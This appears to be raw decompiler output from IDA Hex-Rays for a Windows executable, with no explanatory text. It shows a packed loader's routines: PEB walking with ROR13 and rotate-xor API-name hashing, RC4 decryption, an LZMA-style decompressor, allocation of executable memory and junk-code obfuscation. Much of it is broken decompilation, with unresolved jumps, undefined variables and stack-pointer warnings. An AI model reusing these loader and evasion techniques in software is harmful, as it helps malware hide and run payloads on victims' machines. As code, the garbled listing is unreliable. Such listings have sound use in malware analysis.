//----- (00405174) --------------------------------------------------------
int __usercall sub_405174@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 62 < 7 )
    result = 684;
  else
    result = 17;
  return result;
}
// 4034AB: conditional instruction was optimized away because of '%var_1C.4==3E'
// 4034B1: conditional instruction was optimized away because of '%var_1C.4==3E'

//----- (00405CC3) --------------------------------------------------------
int __usercall sub_405CC3@<eax>(int a1@<eax>)
{
  if ( a1 % 60 < 0 )
    JUMPOUT(0x40625F);
  return 110;
}
// 4019B2: control flows out of bounds to 40625F
// 403C3F: control flows out of bounds to 4023B5
// 4047CF: control flows out of bounds to 402168
// 40294D: conditional instruction was optimized away because of 'ebx.4==14'
// 402954: conditional instruction was optimized away because of 'ebx.4==14'

//----- (004061DC) --------------------------------------------------------
int __usercall sub_4061DC@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 254;
  v1 = a1 / 254;
  if ( v2 >= 11 )
    return 13;
  sub_402846(v1);
  return 402;
}
// 402F4D: conditional instruction was optimized away because of 'ebx.4==12'

//----- (0040624C) --------------------------------------------------------
int sub_40624C()
{
  int v0; // eax
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  sub_402846(234);
  v0 = dword_43F617 ^ (dword_43F617 << 11);
  v2 = v0;
  dword_43F617 = dword_43F623;
  dword_43F623 = dword_43F663;
  sub_402846(v0);
  dword_43F663 = dword_43F59A;
  dword_43F59A ^= (v2 >> 8) ^ v2 ^ ((unsigned int)dword_43F59A >> 19);
  return dword_43F59A;
}
// 43F59A: using guessed type int dword_43F59A;
// 43F617: using guessed type int dword_43F617;
// 43F623: using guessed type int dword_43F623;
// 43F663: using guessed type int dword_43F663;

//----- (004063E4) --------------------------------------------------------
int sub_4063E4()
{
  int v0; // eax
  DWORD v2; // [esp+1Ch] [ebp-2C8h]
  int v3; // [esp+30h] [ebp-2B4h]
  DWORD v4; // [esp+ACh] [ebp-238h]
  int v5; // [esp+C4h] [ebp-220h]
  int v6; // [esp+E4h] [ebp-200h]
  DWORD v7; // [esp+100h] [ebp-1E4h]
  DWORD v8; // [esp+104h] [ebp-1E0h]
  int v9; // [esp+114h] [ebp-1D0h]
  DWORD v10; // [esp+11Ch] [ebp-1C8h]
  DWORD v11; // [esp+1B0h] [ebp-134h]
  DWORD v12; // [esp+1C0h] [ebp-124h]
  DWORD v13; // [esp+1C8h] [ebp-11Ch]
  DWORD v14; // [esp+1E4h] [ebp-100h]
  DWORD v15; // [esp+228h] [ebp-BCh]
  int v16; // [esp+26Ch] [ebp-78h]
  DWORD flAllocationType; // [esp+2A4h] [ebp-40h]
  DWORD flProtect; // [esp+2B4h] [ebp-30h]

  GetOEMCP();
  VirtualAlloc(0, 0xE00u, v13, v7);
  GetOEMCP();
  VirtualAlloc(0, 0x600u, flAllocationType, flProtect);
  GetOEMCP();
  GetACP();
  VirtualAlloc(0, 0x600u, v15, v14);
  GetACP();
  VirtualAlloc(0, 0x400u, v12, v11);
  VirtualAlloc(0, 0x500u, v8, v4);
  GetOEMCP();
  GetCurrentThreadId();
  VirtualAlloc(0, 0x1000u, v2, v10);
  GetCurrentThreadId();
  v0 = v3 + ((unsigned int)(v9 + v16 + 1) < 0xE6C) + GetOEMCP();
  if ( v9 + v16 == 3691 )
    v0 = v6 + 988;
  return v0 - v5;
}
// 40657C: variable 'v13' is possibly undefined
// 40657C: variable 'v7' is possibly undefined
// 4013F3: variable 'flAllocationType' is possibly undefined
// 4013F3: variable 'flProtect' is possibly undefined
// 401418: variable 'v15' is possibly undefined
// 401418: variable 'v14' is possibly undefined
// 40143D: variable 'v12' is possibly undefined
// 40143D: variable 'v11' is possibly undefined
// 4066A3: variable 'v8' is possibly undefined
// 4066A3: variable 'v4' is possibly undefined
// 402E55: variable 'v2' is possibly undefined
// 402E55: variable 'v10' is possibly undefined
// 40384D: variable 'v3' is possibly undefined
// 403840: variable 'v9' is possibly undefined
// 403840: variable 'v16' is possibly undefined
// 402EE4: variable 'v6' is possibly undefined
// 404003: variable 'v5' is possibly undefined

//----- (00406B4C) --------------------------------------------------------
int __usercall sub_406B4C@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 100 < 26 )
    result = 212;
  else
    result = 105;
  return result;
}

//----- (00406BFF) --------------------------------------------------------
int __usercall sub_406BFF@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 164 < 3 )
    result = 221;
  else
    result = 153;
  return result;
}
// 4039EA: conditional instruction was optimized away because of '%var_4.4==F0'
// 4039F0: conditional instruction was optimized away because of '%var_4.4==F0'
// 4039F7: conditional instruction was optimized away because of '%var_4.4==F0'
// 406184: conditional instruction was optimized away because of '%var_10.4==F0'

//----- (0040787A) --------------------------------------------------------
int __cdecl sub_40787A(int a1, int a2, unsigned __int8 *a3)
{
  unsigned int v3; // esi
  _BYTE *v4; // eax
  char v5; // cl
  unsigned int i; // esi
  int result; // eax
  int v8; // et2
  int v9; // eax
  unsigned __int8 v10; // bl
  int v11; // edx
  unsigned __int8 *v12; // [esp+Ch] [ebp-8h]
  unsigned __int8 v13; // [esp+13h] [ebp-1h]

  v3 = 0;
  v4 = a3;
  do
  {
    v5 = v3++;
    *v4++ = v5;
  }
  while ( v3 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v13 = 0;
  v10 = 0;
  v12 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v11 = 0;
    LOBYTE(v11) = v10;
    v10 = (v11 + *v12 + *(unsigned __int8 *)(a1 + v13)) % 256;
    sub_408153(&a3[i], &a3[v10]);
    v9 = v13 + 1;
    v8 = v9 % a2;
    result = v9 / a2;
    v13 = v8;
    ++v12;
  }
  return result;
}

//----- (00407CDD) --------------------------------------------------------
void __usercall sub_407CDD(int a1@<eax>)
{
  unsigned __int8 *v1; // esi
  int v2; // ecx
  int v3; // edi
  int v4; // eax
  DWORD (__stdcall **v5)(HANDLE); // ebx
  struct _PEB *v6; // edx
  DWORD (__stdcall *v7)(HANDLE); // edx

  LOBYTE(dword_43E00C) = -56;
  dword_43E008 += 1076;
  v6 = NtCurrentPeb();
  LOBYTE(dword_43E014) = dword_43E014 - 95;
  v7 = (DWORD (__stdcall *)(HANDLE))*((_DWORD *)v6->ImageBaseAddress + 5);
  dword_43E008 = a1;
  while ( 1 )
  {
    v1 = (unsigned __int8 *)*((_DWORD *)v7 + 10);
    v2 = 24;
    v3 = 0;
    do
    {
      v4 = *v1++;
      v5 = &GetFileType;
      if ( (char)v4 >= 97 )
      {
        LOBYTE(v4) = v4 - 32;
        v5 = (DWORD (__stdcall **)(HANDLE))v7;
      }
      dword_43E00C += (int)v5;
      dword_43E014 += (int)v5;
      v3 = v4 + __ROR4__(v3, 13);
      LOBYTE(dword_43E008) = -1;
      --v2;
    }
    while ( v2 );
    dword_43E030 = (int)(v1 - 1);
    v7 = *(DWORD (__stdcall **)(HANDLE))v7;
    if ( v3 == 1783282779 )
    {
      dword_43E018 += 12677;
      JUMPOUT(0x409020);
    }
  }
}
// 407A1F: control flows out of bounds to 409020
// 43E008: using guessed type int dword_43E008;
// 43E00C: using guessed type int dword_43E00C;
// 43E014: using guessed type int dword_43E014;
// 43E018: using guessed type int dword_43E018;
// 43E030: using guessed type int dword_43E030;

//----- (00408153) --------------------------------------------------------
_BYTE *__cdecl sub_408153(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (00408322) --------------------------------------------------------
unsigned int __cdecl sub_408322(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (00408536) --------------------------------------------------------
void __usercall sub_408536(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  qmemcpy(a2, a3, a1);
}

//----- (00408601) --------------------------------------------------------
unsigned __int8 __cdecl sub_408601(_BYTE *a1, unsigned int a2, int a3)
{
  unsigned __int8 v3; // bl
  unsigned __int8 result; // al
  unsigned int i; // [esp+10h] [ebp-8h]
  unsigned __int8 v7; // [esp+17h] [ebp-1h]

  v3 = *(_BYTE *)(a3 + 256);
  v7 = *(_BYTE *)(a3 + 257);
  for ( i = 0; i < a2; ++a1 )
  {
    v3 = (v3 + 1) % 256;
    v7 += *(_BYTE *)(a3 + v3);
    sub_408153((_BYTE *)(a3 + v3), (_BYTE *)(a3 + v7));
    *a1 ^= *(_BYTE *)(a3 + (unsigned __int8)(*(_BYTE *)(a3 + v7) + *(_BYTE *)(a3 + v3)));
    ++i;
  }
  *(_BYTE *)(a3 + 256) = v3;
  result = v7;
  *(_BYTE *)(a3 + 257) = v7;
  return result;
}

//----- (00408841) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_408841@<eax>(int a1@<eax>, int a2@<edi>)
{
  void *v2; // edi
  __int64 v3; // rax
  int result; // eax
  int v5; // ebx
  int v6; // edx
  int v7; // edx

  result = sub_408A23(a1, 262468866);
  dword_43E018 = 10692;
  if ( result )
  {
    dword_43E030 = a2;
    dword_43F5E1 = result;
    dword_43E008 = (int)&MoveFileExA;
    dword_43E048 = 668;
    v5 = 25959;
    result = sub_408A23(result, 1493072574);
    dword_43E02C += 6650;
    if ( result )
    {
      dword_43E014 += 30573;
      dword_43F7BE = result;
      LOBYTE(dword_43E020) = dword_43E020 + 64;
      result = sub_408A23(result, 150532372);
      if ( result )
      {
        dword_43F5CE = result;
        BYTE1(v5) = 67;
        dword_43E020 = v5;
        result = sub_408A23(result, 1916711125);
        dword_43E02C += 30098;
        if ( result )
        {
          dword_43F643 = result;
          result = sub_408A23(result, -2114916129);
          dword_43E044 = 11104;
          if ( result )
          {
            dword_43F683 = result;
            result = sub_408A23(result, 1216340331);
            v7 = dword_43F408 + v6;
            if ( result )
            {
              dword_43F62F = result;
              BYTE1(v7) = byte_43F6A4;
              dword_43E00C -= v7;
              result = sub_408A23(result, 255840707);
              if ( result )
              {
                dword_43F7B2 = result;
                v2 = off_43E220;
                v3 = ((__int64 (__fastcall *)(int, int))loc_40734A)(dword_43E588, 7993);
                dword_43E028 += (int)v2;
                dword_43E044 = 30307;
                dword_43E01C += dword_43F0C8;
                dword_43E03C = (int)&HeapDestroy + HIDWORD(v3);
                __asm { retn }
              }
            }
          }
        }
      }
    }
  }
  return result;
}
// 408064: positive sp value 4 has been found
// 40938E: variable 'v6' is possibly undefined
// 43E008: using guessed type int dword_43E008;
// 43E00C: using guessed type int dword_43E00C;
// 43E014: using guessed type int dword_43E014;
// 43E018: using guessed type int dword_43E018;
// 43E01C: using guessed type int dword_43E01C;
// 43E020: using guessed type int dword_43E020;
// 43E028: using guessed type int dword_43E028;
// 43E02C: using guessed type int dword_43E02C;
// 43E030: using guessed type int dword_43E030;
// 43E03C: using guessed type int dword_43E03C;
// 43E044: using guessed type int dword_43E044;
// 43E048: using guessed type int dword_43E048;
// 43E220: using guessed type void *off_43E220;
// 43E588: using guessed type int dword_43E588;
// 43F0C8: using guessed type int dword_43F0C8;
// 43F408: using guessed type int dword_43F408;
// 43F5CE: using guessed type int dword_43F5CE;
// 43F5E1: using guessed type int dword_43F5E1;
// 43F62F: using guessed type int dword_43F62F;
// 43F643: using guessed type int dword_43F643;
// 43F683: using guessed type int dword_43F683;
// 43F6A4: using guessed type char byte_43F6A4;
// 43F7B2: using guessed type int dword_43F7B2;
// 43F7BE: using guessed type int dword_43F7BE;

//----- (0040892D) --------------------------------------------------------
int __stdcall sub_40892D(int a1, unsigned __int8 *a2, unsigned int *a3)
{
  unsigned int v3; // eax
  unsigned int *v4; // edx
  int v5; // ecx
  unsigned int v6; // edx
  int v7; // edx
  unsigned __int8 *v8; // ecx
  unsigned int v9; // eax
  unsigned int v10; // edx
  int v11; // ecx
  unsigned int v12; // ecx
  unsigned int v13; // esi
  int v14; // esi
  unsigned int v15; // edx
  unsigned int v16; // eax
  int v17; // ecx
  int v18; // ecx
  int v19; // ecx
  int v20; // esi
  int v21; // ecx
  unsigned int v22; // esi
  int v23; // edx
  int v24; // esi
  unsigned int v25; // ecx
  unsigned int v26; // edx
  int v27; // esi
  unsigned int v28; // ecx
  unsigned int v29; // edi
  int v30; // ecx
  int v31; // ebx
  int v32; // ecx
  int v33; // edx
  int v34; // edi
  unsigned int v35; // ecx
  unsigned int v36; // edx
  unsigned __int8 v37; // dl
  int v38; // esi
  int v39; // ebx
  int v41; // edx
  unsigned int v42; // eax
  unsigned int *v43; // edi
  unsigned int v44; // eax
  int v45; // ecx
  int v46; // ebx
  unsigned int v47; // edx
  unsigned int v48; // esi
  unsigned int *v49; // edi
  int v50; // ecx
  unsigned int *v51; // edi
  int v52; // edi
  unsigned int v53; // edi
  int v54; // edx
  unsigned int v55; // ecx
  int v56; // edi
  unsigned int v57; // edi
  int v58; // edx
  unsigned int *v59; // ecx
  int v60; // ecx
  int v61; // ebx
  int v62; // edx
  unsigned int v63; // ecx
  unsigned int v64; // ebx
  unsigned int v65; // edx
  unsigned int v66; // eax
  unsigned int *v67; // edi
  int v69; // [esp+4h] [ebp-2Ch]
  int v70; // [esp+4h] [ebp-2Ch]
  int v71; // [esp+Ch] [ebp-24h]
  int v72; // [esp+10h] [ebp-20h]
  int v73; // [esp+1Ch] [ebp-14h]
  int v74; // [esp+20h] [ebp-10h]
  int v75; // [esp+24h] [ebp-Ch]
  unsigned __int8 v77; // [esp+2Fh] [ebp-1h]
  unsigned int v78; // [esp+3Ch] [ebp+Ch]

  v73 = 1;
  memset32(a3, 1024, 0x30736u);
  v74 = 0;
  v77 = 0;
  v75 = 0;
  v78 = 0;
  v44 = -1;
  v45 = 5;
  do
  {
    v24 = *a2++;
    --v45;
    v78 = v24 | (v78 << 8);
  }
  while ( v45 );
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v20 = v74 & 3;
        v49 = &a3[16 * v75 + v20];
        if ( v44 < 0x1000000 )
        {
          v50 = *a2 | (v78 << 8);
          v44 <<= 8;
          ++a2;
          v78 = v50;
        }
        v63 = *v49;
        v64 = *v49 * (v44 >> 11);
        if ( v78 >= v64 )
          break;
        *v49 = v63 + ((2048 - v63) >> 5);
        v7 = 1;
        v44 = v64;
        if ( v75 >= 7 )
          JUMPOUT(0x407679);
        do
        {
          v51 = &a3[768 * v77 + 1846 + v7];
          if ( v44 < 0x1000000 )
          {
            v21 = *a2 | (v78 << 8);
            v44 <<= 8;
            ++a2;
            v78 = v21;
          }
          v12 = *v51;
          v13 = *v51 * (v44 >> 11);
          if ( v78 >= v13 )
          {
            v78 -= v13;
            v44 -= v13;
            *v51 = v12 - (v12 >> 5);
            v7 = 2 * v7 + 1;
          }
          else
          {
            v44 = *v51 * (v44 >> 11);
            *v51 = v12 + ((2048 - v12) >> 5);
            v7 *= 2;
          }
        }
        while ( v7 < 256 );
        v14 = v74++;
        v77 = v7;
        *(_BYTE *)(v14 + a1) = v7;
        if ( v75 >= 4 )
          v75 -= 3;
        else
          v75 = 0;
      }
      v78 -= v64;
      v3 = v44 - v64;
      *v49 = v63 - (v63 >> 5);
      v4 = &a3[v75 + 192];
      if ( v3 < 0x1000000 )
      {
        v5 = *a2 | (v78 << 8);
        v3 <<= 8;
        ++a2;
        v78 = v5;
      }
      v28 = *v4;
      v29 = *v4 * (v3 >> 11);
      if ( v78 < v29 )
        break;
      v78 -= v29;
      v66 = v3 - v29;
      *v4 = v28 - (v28 >> 5);
      v67 = &a3[v75 + 204];
      if ( v66 < 0x1000000 )
      {
        v11 = *a2 | (v78 << 8);
        v66 <<= 8;
        ++a2;
        v78 = v11;
      }
      v35 = *v67;
      v36 = *v67 * (v66 >> 11);
      if ( v78 >= v36 )
      {
        *v67 = v35 - (v35 >> 5);
        JUMPOUT(0x408A0B);
      }
      *v67 = v35 + ((2048 - v35) >> 5);
      v42 = v36;
      v43 = &a3[16 * v75 + 240 + v20];
      if ( v36 < 0x1000000 )
      {
        v42 = v36 << 8;
        v32 = *a2++ | (v78 << 8);
        v78 = v32;
      }
      v25 = *v43;
      v26 = *v43 * (v42 >> 11);
      if ( v78 >= v26 )
      {
        v78 -= v26;
        v16 = v42 - v26;
        *v43 = v25 - (v25 >> 5);
        v75 = v75 >= 7 ? 11 : 8;
        v59 = a3 + 1332;
        goto LABEL_38;
      }
      v27 = v74;
      v44 = *v43 * (v42 >> 11);
      *v43 = v25 + ((2048 - v25) >> 5);
      v75 = 2 * (v75 >= 7) + 9;
      v17 = v74 - v73;
      ++v74;
      v77 = *(_BYTE *)(v17 + a1);
      *(_BYTE *)(v27 + a1) = v77;
    }
    v16 = *v4 * (v3 >> 11);
    *v4 = v28 + ((2048 - v28) >> 5);
    v75 = v75 >= 7 ? 3 : 0;
    v59 = a3 + 818;
LABEL_38:
    if ( v16 < 0x1000000 )
    {
      v33 = *a2 | (v78 << 8);
      v16 <<= 8;
      ++a2;
      v78 = v33;
    }
    v15 = *v59;
    v53 = v15 * (v16 >> 11);
    if ( v78 < v53 )
    {
      v44 = v15 * (v16 >> 11);
      v71 = 0;
      *v59 = v15 + ((2048 - v15) >> 5);
      v18 = (int)&v59[8 * v20 + 2];
LABEL_67:
      v72 = 3;
      goto LABEL_73;
    }
    v78 -= v53;
    v9 = v16 - v53;
    v10 = v15 - (v15 >> 5);
    *v59 = v10;
    if ( v9 < 0x1000000 )
    {
      v41 = *a2 | (v78 << 8);
      v9 <<= 8;
      ++a2;
      v78 = v41;
    }
    v6 = v59[1];
    v57 = v6 * (v9 >> 11);
    if ( v78 < v57 )
    {
      v44 = v6 * (v9 >> 11);
      v59[1] = v6 + ((2048 - v6) >> 5);
      v18 = (int)&v59[8 * v20 + 130];
      v71 = 8;
      goto LABEL_67;
    }
    v78 -= v57;
    v44 = v9 - v57;
    v59[1] = v6 - (v6 >> 5);
    v18 = (int)(v59 + 258);
    v71 = 16;
    v72 = 8;
LABEL_73:
    v70 = v72;
    v31 = 1;
    do
    {
      if ( v44 < 0x1000000 )
      {
        v54 = *a2 | (v78 << 8);
        v44 <<= 8;
        ++a2;
        v78 = v54;
      }
      v47 = *(_DWORD *)(v18 + 4 * v31);
      v48 = v47 * (v44 >> 11);
      if ( v78 >= v48 )
      {
        v78 -= v48;
        v44 -= v48;
        *(_DWORD *)(v18 + 4 * v31) = v47 - (v47 >> 5);
        v31 = 2 * v31 + 1;
      }
      else
      {
        v44 = v47 * (v44 >> 11);
        *(_DWORD *)(v18 + 4 * v31) = v47 + ((2048 - v47) >> 5);
        v31 *= 2;
      }
    }
    while ( v70-- != 1 );
    v23 = 1;
    v46 = v71 - (1 << v72) + v31;
    if ( v75 >= 4 )
    {
      v34 = v73;
      goto LABEL_82;
    }
    v75 += 7;
    v19 = v46 >= 4 ? 3 : v46;
    v52 = (int)&a3[64 * v19 + 432];
    v69 = 6;
    do
    {
      if ( v44 < 0x1000000 )
      {
        v60 = *a2 | (v78 << 8);
        v44 <<= 8;
        ++a2;
        v78 = v60;
      }
      v55 = *(_DWORD *)(v52 + 4 * v23);
      v22 = v55 * (v44 >> 11);
      if ( v78 >= v22 )
      {
        v78 -= v22;
        v44 -= v22;
        *(_DWORD *)(v52 + 4 * v23) = v55 - (v55 >> 5);
        v23 = 2 * v23 + 1;
      }
      else
      {
        v44 = v55 * (v44 >> 11);
        *(_DWORD *)(v52 + 4 * v23) = v55 + ((2048 - v55) >> 5);
        v23 *= 2;
      }
      --v69;
    }
    while ( v69 );
    v62 = v23 - 64;
    if ( v62 >= 4 )
    {
      v56 = v62 & 1 | 2;
      if ( v62 >= 14 )
      {
        v30 = (v62 >> 1) - 5;
        do
        {
          if ( v44 < 0x1000000 )
          {
            v58 = *a2 | (v78 << 8);
            v44 <<= 8;
            ++a2;
            v78 = v58;
          }
          v44 >>= 1;
          v56 *= 2;
          if ( v78 >= v44 )
          {
            v78 -= v44;
            v56 |= 1u;
          }
          --v30;
        }
        while ( v30 );
        v61 = (int)(a3 + 802);
      }
      else
      {
        v61 = (int)&a3[(v56 << ((v62 >> 1) - 1)) - v62 + 687];
      }
      if ( v44 < 0x1000000 )
      {
        v44 <<= 8;
        v78 = *a2 | (v78 << 8);
      }
      v65 = *(_DWORD *)(v61 + 4);
      if ( v78 >= v65 * (v44 >> 11) )
        *(_DWORD *)(v61 + 4) = v65 - (v65 >> 5);
      else
        *(_DWORD *)(v61 + 4) = v65 + ((2048 - v65) >> 5);
      JUMPOUT(0x407376);
    }
    v34 = v62 + 1;
    v73 = v62 + 1;
    if ( v62 == -1 )
      return v74;
LABEL_82:
    v39 = v46 + 2;
    v8 = (unsigned __int8 *)(a1 + v74 - v34);
    do
    {
      v37 = *v8;
      v38 = v74;
      --v39;
      ++v74;
      ++v8;
      v77 = v37;
      *(_BYTE *)(v38 + a1) = v37;
    }
    while ( v39 );
  }
}
// 407FE9: control flows out of bounds to 407679
// 408DAF: control flows out of bounds to 407376
// 40955E: control flows out of bounds to 408A0B
// 408406: conditional instruction was optimized away because of '%var_C.4 in (4..6)'

//----- (00408A23) --------------------------------------------------------
int __usercall sub_408A23@<eax>(int a1@<eax>, int a2)
{
  unsigned int i; // esi
  _DWORD *v3; // edi
  int v5; // eax
  int v6; // ebx
  int v7; // eax
  unsigned __int16 *v8; // [esp+18h] [ebp-Ch]
  _DWORD *v9; // [esp+1Ch] [ebp-8h]
  int v10; // [esp+20h] [ebp-4h]

  sub_407CDD(a1);
  v6 = v5;
  v7 = v5 + *(_DWORD *)(v5 + 60) + 24;
  v3 = (_DWORD *)(v6 + *(_DWORD *)(v7 + 96));
  if ( HIWORD(a2) )
  {
    v9 = (_DWORD *)(v6 + v3[8]);
    v8 = (unsigned __int16 *)(v6 + v3[9]);
    for ( i = 0; v3[6] > i; ++i )
    {
      if ( sub_408322((_BYTE *)(v6 + *v9)) == a2 )
      {
        v10 = *v8;
        break;
      }
      ++v9;
      ++v8;
    }
    if ( v3[6] == i )
      return 0;
  }
  else
  {
    v10 = (unsigned __int16)a2 - v3[4];
  }
  return v6 + *(_DWORD *)(v6 + v3[7] + 4 * v10);
}
// 40964C: variable 'v5' is possibly undefined
// 407DF0: variable 'v10' is possibly undefined

//----- (00408FD4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
char __usercall sub_408FD4@<al>(int a1@<ebx>)
{
  int v1; // ecx
  int v2; // ebx
  unsigned int v3; // edx
  int v4; // eax
  int v5; // eax
  char *v6; // edi
  unsigned int v7; // edi
  _BYTE *v8; // edx
  int v9; // ecx
  int v10; // edi
  int v11; // ebx
  int v12; // esi
  int v13; // ecx
  unsigned int v14; // esi
  bool v15; // cf
  int v16; // edi
  int v17; // ecx
  signed int v18; // ebx
  int v19; // ecx
  unsigned int v20; // edx
  bool v21; // zf
  int *v22; // edx
  int v23; // eax
  int v24; // ecx
  int v25; // ecx
  unsigned int v26; // esi
  char v27; // dh
  int v28; // ecx
  int v29; // ecx
  int v30; // ecx
  _BYTE *v31; // esi
  _BYTE *v32; // esi
  int v33; // edx
  unsigned int v35; // [esp-10h] [ebp-10h]

  v20 = v35;
  *(_DWORD *)(a1 - 4) = 0;
  __writefsdword(0, v35);
  LOBYTE(v20) = v35 - byte_43F224;
  v21 = (_BYTE)a1 + *(_BYTE *)(v20 + 93) == 0;
  *(_BYTE *)(v20 + 93) += a1;
  if ( v21 )
  {
    sub_41035B();
    v23 = 1745693542;
    v25 = v24 - 1;
    if ( v21 && v25 )
      JUMPOUT(0x409045);
    v15 = __CFADD__(BYTE1(a1), *((_BYTE *)&HeapDestroy + (_DWORD)v22));
    *((_BYTE *)&HeapDestroy + (_DWORD)v22) += BYTE1(a1);
    LOBYTE(v23) = 102 - (v15 - 115);
    *(_BYTE *)(a1 + 9122885) += v25;
    *v22 = v23;
    *(_DWORD *)(v23 - 32) = v22;
  }
  else
  {
    v26 = v20;
    v23 = MEMORY[0xE074BDA4]();
    *(_BYTE *)(v28 + v23 + 1138755605) += v27;
    v29 = v26 + 18842;
    if ( v23 )
    {
      LOBYTE(dword_43E004) = -65;
      dword_43F673 = v23;
      LOBYTE(v29) = byte_43E194 + v26 - 102;
      dword_43E024 = v29;
      v23 = sub_408A23(v23, 976580703);
      dword_43E044 -= v1;
      dword_43E024 += 7230;
      if ( v23 )
      {
        dword_43F5A2 = v23;
        dword_43E034 += (int)&LoadLibraryExA;
        v16 = dword_43E7C8;
        dword_43E048 -= v26 + 32223;
        LOBYTE(dword_43E03C) = -108;
        v23 = ((int (__fastcall *)(int, void **, _DWORD, int, int, int))dword_43F673)(
                dword_43F470,
                off_43E448,
                0,
                0x2000,
                12288,
                64);
        v18 = (signed int)&LoadLibraryExA - v15 - 6991;
        dword_43E00C -= v18;
        if ( v23 )
        {
          v15 = (unsigned __int8)dword_43E038 < 0x5Du;
          LOBYTE(dword_43E038) = dword_43E038 - 93;
          v19 = v15 + v17 + 17019;
          dword_43F79A = v23;
          v15 = dword_43E01C < (unsigned int)&DeleteCriticalSection;
          dword_43E01C -= (int)&DeleteCriticalSection;
          BYTE1(v19) -= v15 + 39;
          dword_43E04C += (int)&DeleteCriticalSection;
          v12 = v23;
          LOBYTE(dword_43E048) = -124;
          dword_43E014 -= 8251;
          v4 = ((int (__fastcall *)(int, int, void *, int, int, _DWORD, int, _DWORD, _DWORD))dword_43F5CE)(
                 v18 ^ v19,
                 26511,
                 &unk_43F69B,
                 -1073741824,
                 1,
                 0,
                 3,
                 0,
                 0);
          v10 = v16
              - 24446
              - ((__CFADD__(__CFSHR__(v12, 3), 27743) | __CFADD__(__CFSHR__(v12, 3) + 27743, 29213))
               + __CFSHR__(v12, 3)
               + 56956)
              + 30858;
          v11 = v4;
          dword_43E014 += v10;
          dword_43E048 = v10;
          LOBYTE(v11) = byte_43F69C;
          ((void (__cdecl *)(int, int, int, void *, _DWORD, int))dword_43F62F)(
            v4,
            dword_43F79A,
            0x2000,
            &unk_420E76,
            0,
            v4);
          dword_43E014 = v11;
          ((void (*)(void))dword_43F643)();
          v2 = v15 + v11 + 10100;
          v15 = dword_43E044 < v3;
          dword_43E044 -= v3;
          ((void (__thiscall *)(int, void *))dword_43F683)(v15 + v30 + 20777, &unk_43F69B);
          dword_43E030 -= 8080;
          v13 = 0x2000;
          v32 = (_BYTE *)dword_43F79A;
          v33 = 0;
          dword_43E008 = 16893;
          v5 = 0;
          dword_43E03C = dword_43E090 + v2 - ((__PAIR64__(dword_43F79A, dword_43E090) + (unsigned int)v2) >> 32) - 12593;
          v6 = (char *)&GetFullPathNameA - dword_43EF48;
          do
          {
            dword_43E030 += 32690;
            LOBYTE(v5) = *v32++;
            dword_43E010 += (int)v6;
            v33 += v5;
            v5 = 0;
            v6 = (char *)&SetPriorityClass + 21637;
            --v13;
          }
          while ( v13 );
          dword_43F64B = v33;
          v31 = &v32[dword_43E348];
          dword_43E034 = 7162;
          LOBYTE(dword_43E044) = dword_43E044 - 74;
          ((void (__cdecl *)(int, _DWORD, int))dword_43F5A2)(dword_43F79A, 0, 0x8000);
          v14 = (unsigned int)(v31 + 21018);
          LOBYTE(v23) = 0;
          v15 = __CFADD__((_BYTE)dword_43E040, -18);
          LOBYTE(dword_43E040) = dword_43E040 - 18;
          v9 = 0x2000;
          v8 = (_BYTE *)(v14 - (v15 + 19407));
          v7 = (unsigned int)&unk_420F76;
          BYTE1(v8) = byte_43E0C4;
          do
          {
            v14 ^= v7;
            v15 = (unsigned int)dword_43E008 < 0x7A43;
            dword_43E008 -= 31299;
            *(_BYTE *)v7++ = 0;
            v8 += -v15 - 2812;
            dword_43E03C = 10314;
            --v9;
          }
          while ( v9 );
        }
      }
    }
  }
  return v23;
}
// 408FF2: positive sp value 10 has been found
// 409000: control flows out of bounds to 409045
// 43F62F: invalid function type has been ignored
// 43F643: invalid function type has been ignored
// 43F5CE: invalid function type has been ignored
// 43F683: invalid function type has been ignored
// 408FD8: variable 'v35' is possibly undefined
// 409000: variable 'v24' is possibly undefined
// 409000: variable 'v21' is possibly undefined
// 409002: variable 'v22' is possibly undefined
// 409025: variable 'v27' is possibly undefined
// 409025: variable 'v28' is possibly undefined
// 40707A: variable 'v1' is possibly undefined
// 408F8A: variable 'v15' is possibly undefined
// 408FAA: variable 'v17' is possibly undefined
// 4077CF: variable 'v3' is possibly undefined
// 409079: variable 'v30' is possibly undefined
// 41035B: using guessed type _DWORD sub_41035B();
// 43E004: using guessed type int dword_43E004;
// 43E008: using guessed type int dword_43E008;
// 43E00C: using guessed type int dword_43E00C;
// 43E010: using guessed type int dword_43E010;
// 43E014: using guessed type int dword_43E014;
// 43E01C: using guessed type int dword_43E01C;
// 43E024: using guessed type int dword_43E024;
// 43E030: using guessed type int dword_43E030;
// 43E034: using guessed type int dword_43E034;
// 43E038: using guessed type int dword_43E038;
// 43E03C: using guessed type int dword_43E03C;
// 43E040: using guessed type int dword_43E040;
// 43E044: using guessed type int dword_43E044;
// 43E048: using guessed type int dword_43E048;
// 43E04C: using guessed type int dword_43E04C;
// 43E090: using guessed type int dword_43E090;
// 43E0C4: using guessed type char byte_43E0C4;
// 43E194: using guessed type char byte_43E194;
// 43E348: using guessed type int dword_43E348;
// 43E448: using guessed type void **off_43E448;
// 43E7C8: using guessed type int dword_43E7C8;
// 43EF48: using guessed type int dword_43EF48;
// 43F224: using guessed type char byte_43F224;
// 43F470: using guessed type int dword_43F470;
// 43F5A2: using guessed type int dword_43F5A2;
// 43F5CE: using guessed type int dword_43F5CE;
// 43F62F: using guessed type int dword_43F62F;
// 43F643: using guessed type int dword_43F643;
// 43F64B: using guessed type int dword_43F64B;
// 43F673: using guessed type int dword_43F673;
// 43F683: using guessed type int dword_43F683;
// 43F69C: using guessed type char byte_43F69C;
